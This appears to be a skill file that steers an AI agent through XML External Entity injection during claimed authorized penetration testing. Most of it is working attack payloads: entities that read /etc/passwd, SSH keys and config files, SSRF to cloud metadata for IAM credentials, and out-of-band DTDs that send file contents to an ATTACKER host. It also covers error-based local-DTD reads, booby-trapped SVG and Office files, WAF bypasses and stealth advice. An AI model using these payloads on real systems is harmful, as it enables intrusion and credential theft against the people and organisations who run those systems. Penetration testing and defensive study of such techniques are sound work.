---
name: xxe
description: >
  Guide XML External Entity (XXE) injection exploitation during authorized
  penetration testing.
keywords:
  - XXE
  - XML injection
  - XML external entity
  - DTD injection
  - XML entity expansion
  - blind XXE
  - OOB XXE
  - out-of-band XXE
  - error-based XXE
  - XInclude
  - SVG XXE
  - DOCX XXE
  - XLSX XXE
  - SOAP XXE
tools:
  - burpsuite
  - xxeserv
  - oxml_xxe
  - interactsh
opsec: medium
---

# XML External Entity (XXE) Injection

You are helping a penetration tester exploit XXE injection. The target application
parses XML input without disabling external entity resolution. The goal is to read
files, perform SSRF, or achieve remote code execution via entity processing. All
testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[xxe] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- An endpoint that parses XML (POST body, file upload, SOAP, SAML, RSS/Atom feed)
- Common vulnerable surfaces: XML APIs, file import (DOCX/XLSX/SVG), SOAP services,
  SAML SSO, XML-RPC, content-type switchable endpoints (JSON → XML)

## Step 1: Assess

If not already provided, determine:
1. **Injection surface** — direct XML body, file upload, SOAP envelope, SAML
   assertion, parameter within XML
2. **Parser technology** — PHP (libxml2), Java (DocumentBuilder, SAX, JAXB),
   .NET (XmlDocument, XmlReader), Python (lxml, etree)
3. **Reflection** — is entity content reflected in the response? (classic vs blind)
4. **Outbound connectivity** — can the server make HTTP/DNS/FTP requests outbound?

Quick detection probe (replace entity in a reflected field):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe "testvalue123">]>
<root><field>&xxe;</field></root>
```

If `testvalue123` appears in the response, the parser resolves entities — proceed
to Step 2. If not reflected, skip to Step 4 (blind).

Skip assessment if context was already provided.

## Step 2: Classic XXE (File Read)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><field>&xxe;</field></root>
```

Swap the ENTITY URI for other targets. All variations below use this same wrapper.

```xml
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">

<!-- PHP base64 (avoids XML special char issues with <, &) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- PHP expect (RCE — requires expect extension) -->
<!ENTITY xxe SYSTEM "expect://id">

<!-- Java directory listing (file:// on a directory lists contents) -->
<!ENTITY xxe SYSTEM "file:///">
<!ENTITY xxe SYSTEM "file:///etc/">
```

**Useful targets — Linux:** `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`,
`/home/<user>/.ssh/id_rsa`, `/var/www/html/config.php`

**Windows:** `C:\windows\win.ini`, `C:\inetpub\wwwroot\web.config`

## Step 3: XXE to SSRF

Use the same wrapper from Step 2 with HTTP/UNC URIs:

```xml
<!-- Internal resource access -->
<!ENTITY xxe SYSTEM "http://internal.service:8080/admin">

<!-- AWS IMDSv1 — enumerate roles, then fetch credentials -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">

<!-- NTLM hash capture (Windows — set up Responder first) -->
<!ENTITY xxe SYSTEM "file://///ATTACKER_IP/share/test.jpg">
```

## Step 4: Blind XXE (Out-of-Band)

When entity content is not reflected in the response.

### OOB Detection (Ping)

General entity — triggers HTTP callback:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://CALLBACK.burpcollaborator.net">
]>
<root><field>&xxe;</field></root>
```

Parameter entity — works when general entities are blocked:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://CALLBACK.burpcollaborator.net/detect">
  %xxe;
]>
<root></root>
```

If you receive a callback, the parser resolves external entities — proceed to
exfiltration.

### OOB Exfiltration via External DTD

XML payload (send to target):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<root></root>
```

Host `evil.dtd` on your server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;
```

Data arrives as a query parameter in your HTTP logs.

**Limitation**: HTTP exfiltration breaks on multi-line files. Workarounds:
- **PHP**: swap file entity to `php://filter/convert.base64-encode/resource=/etc/passwd`
- **FTP**: swap exfil URI to `ftp://ATTACKER:2121/%file;` — FTP handles newlines
  (required for Java targets)

FTP server for OOB:

```bash
xxeserv -o files.log -p 2121 -w -wd public -wp 8000    # staaldraad/xxeserv
python3 230-OOB.py 2121                                  # lc/230-OOB
```

## Step 5: Error-Based XXE

Extracts file contents embedded in parser error messages. Works when both
reflection and outbound connectivity are blocked.

### Via Remote DTD

XML payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/error.dtd">
  %dtd;
]>
<root></root>
```

`error.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser error message contains the file contents: `"file:///nonexistent/root:x:0:0:..."`.

### Via Local System DTD (No Outbound Required)

When egress is completely blocked, repurpose a DTD already on the filesystem.
Find a parameter entity you can redefine to inject your payload.

**Linux — `fonts.dtd`:**

```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local;
]>
<root></root>
```

**Windows — `cim20.dtd`:**

```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///C:\windows\win.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ENTITY test "test"'>
  %local;
]>
<root></root>
```

**Other injectable DTDs** (same pattern — redefine the entity with your payload):

| Path | Entity | Platform |
|------|--------|----------|
| `/usr/share/yelp/dtd/docbookx.dtd` | `%ISOamso` | GNOME |
| `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd` | varies | Linux |

Use `dtd-finder` to scan system images for injectable DTDs:
`java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/system-image.tar`

## Step 6: XInclude

When you cannot control the `DOCTYPE` declaration — your input is placed inside
an XML document the server constructs. Use XInclude instead of entity injection:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

URL-encoded (inject into a POST parameter):

```
field=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

XInclude requires the parser to support it (most Java and .NET parsers do).

## Step 7: XXE via File Upload

### SVG

Upload as an image/avatar. Content is read when the server rasterizes the SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

OOB variant (blind — file content sent to attacker):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
  %eval;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16">&exfil;</text>
</svg>
```

### DOCX / XLSX / PPTX

These are ZIP archives containing XML. Extract, inject XXE into an internal XML
file, repackage:

```bash
unzip target.xlsx -d xxe_work && cd xxe_work
# Add DOCTYPE + entity to xl/workbook.xml (or xl/sharedStrings.xml, word/document.xml, [Content_Types].xml)
zip -u ../malicious.xlsx xl/workbook.xml
```

Add a DOCTYPE before the root element in the target XML file — use the same
external DTD pattern from Step 4. Tool: `oxml_xxe` automates this for
Office/SVG/PDF.

### SOAP / RSS

Inject into XML-based formats — add DOCTYPE before or wrap in CDATA:

```xml
<!-- SOAP: CDATA wrapping -->
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;]><root/>]]></foo></soap:Body>

<!-- RSS: standard XXE in feed -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<rss version="2.0"><channel><title>&xxe;</title></channel></rss>
```

## Step 8: WAF / Filter Bypass

### Encoding Bypass

**UTF-16** — bypasses ASCII-level WAF pattern matching (parsers auto-detect via BOM):

```bash
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > payload_utf16.xml
```

**UTF-7** — set `encoding="UTF-7"` in XML declaration, encode payload in UTF-7
(`+ADw-` = `<`, `+AD4-` = `>`).

**HTML numeric entities** — bypass `%` restrictions inside DTD entity values by
encoding as `&#x25;`, `&#x3C;` for `<`, `&#x22;` for `"`, etc.

### Content-Type Switching

Some endpoints accept both JSON and XML. Switch `Content-Type: application/json`
to `application/xml` (or `text/xml`, `application/soap+xml`) and convert the
JSON body to XML with an XXE DOCTYPE. Burp extension **Content Type Converter**
(NetSPI) automates this.

### Keyword Bypass

If `SYSTEM` or `ENTITY` are blocked:

- Use `PUBLIC` instead of `SYSTEM`:
  `<!ENTITY xxe PUBLIC "any text" "file:///etc/passwd">`
- Use parameter entities (`%name;`) instead of general entities (`&name;`)
- Use XInclude (no DOCTYPE needed)
- Encode the entire payload as UTF-16

## Step 9: Escalate or Pivot

## OPSEC Notes

- External entity resolution generates outbound HTTP/DNS/FTP — visible to network
  monitoring and WAFs. `file://` reads are local (no network traffic).
- Error-based via local DTD is the stealthiest option (no outbound traffic)
- OOB callbacks to Burp Collaborator / interactsh are fingerprinted by some WAFs
- SAML XXE testing affects authentication flows — coordinate with the client

## Troubleshooting

### Entity Not Resolved

- Confirm the parser processes external entities: test with internal entity first
  (`<!ENTITY test "hello">` → `&test;`)
- Try parameter entities (`%name;`) — some parsers block general entities but
  allow parameter entities
- Try XInclude — works when DOCTYPE is stripped
- Switch to `PUBLIC` keyword if `SYSTEM` is filtered
- The parser may have `LIBXML_NOENT` disabled (PHP) or
  `disallow-doctype-decl` enabled (Java) — entity resolution is off

### File Read Returns Empty / Error

- File may contain XML special characters (`<`, `&`) that break parsing — use
  `php://filter/convert.base64-encode/resource=` (PHP) or CDATA wrapping
- File may not exist or lack read permissions — try `/etc/hostname` first
  (small, always readable)
- Java: `file:///etc/passwd` fails silently for files with certain characters —
  use FTP exfiltration instead
- .NET: `file://` may require `file:///C:\path` format on Windows

### OOB Callback Not Received

- Verify outbound HTTP is allowed (try DNS-based callback first — less commonly
  blocked)
- Firewall may block outbound on non-standard ports — use port 80 or 443
- Use FTP instead of HTTP for the exfiltration channel
- Try error-based via local DTD (no outbound needed)
- Parameter entity in internal DTD subset cannot reference another parameter
  entity — must use external DTD file

### DTD Nesting Errors

- `%` inside entity value in **internal** DTD must be escaped as `&#x25;`
- `%` in **external** DTD files does NOT need escaping — use `%name;` directly
- Entity call order matters: `%eval;` must be called before `%error;`

### Parser Defaults

- **Java DocumentBuilder**: XXE enabled by default — most reliable target
- **PHP libxml2 ≥2.9**: external entities disabled unless `LIBXML_NOENT` is set
- **Python lxml**: external entities off unless `resolve_entities=True`
- **.NET XmlDocument**: XXE enabled pre-.NET 4.5.2, disabled after
- **.NET XmlReader**: DTD processing off unless `DtdProcessing.Parse` is set

### Automated Tools

```bash
ruby XXEinjector.rb --host=ATTACKER --httpport=8080 --file=request.txt --path=/etc/passwd --oob=http
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
python oxml_xxe.py -m payload.xml -o malicious.docx
```
